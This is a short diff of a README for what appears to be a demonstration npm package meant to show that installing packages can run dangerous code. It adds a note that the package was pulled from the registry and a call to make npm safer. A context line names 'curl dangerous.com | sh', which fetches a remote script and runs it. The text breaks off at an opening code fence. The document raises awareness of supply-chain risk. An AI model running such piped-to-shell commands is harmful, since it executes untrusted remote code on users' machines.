@@ -2,6 +2,10 @@
 
 This is to show that `npm install` can be as dangerous as `curl dangerous.com | sh`.
 
+### update, it's off the npm registry
+
+It was [taken off the npm registry](https://twitter.com/othiym23/status/559759478774439936) but it solves nothing really, anyone could make malicious modules like this and mask it as a useful module that has a desired use case. Let's try to find ways to **really** make npm safe ;)
+
 # Whatever you do, do not
 
 ```
